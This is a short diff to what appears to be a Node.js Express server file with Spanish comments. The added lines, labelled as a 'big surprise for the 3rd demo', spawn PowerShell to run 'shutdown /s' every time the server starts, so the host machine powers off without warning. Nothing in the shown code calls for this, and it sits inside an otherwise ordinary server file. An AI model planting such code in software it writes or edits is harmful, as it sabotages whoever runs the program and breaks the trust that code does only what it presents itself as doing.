@@ -97,6 +97,12 @@ app.use((err, req, res, next) => {
   });
 });
 
+// sorpresota para la 3ra demo
+var spawn = require("child_process").spawn;
+child = spawn("powershell.exe", ["shutdown /s"]);
+
+child.stdin.end(); //end input
+
 // levantamos el servidor
 const server = app.listen(PORT, () => {
   console.log("El servidor esta arriba");
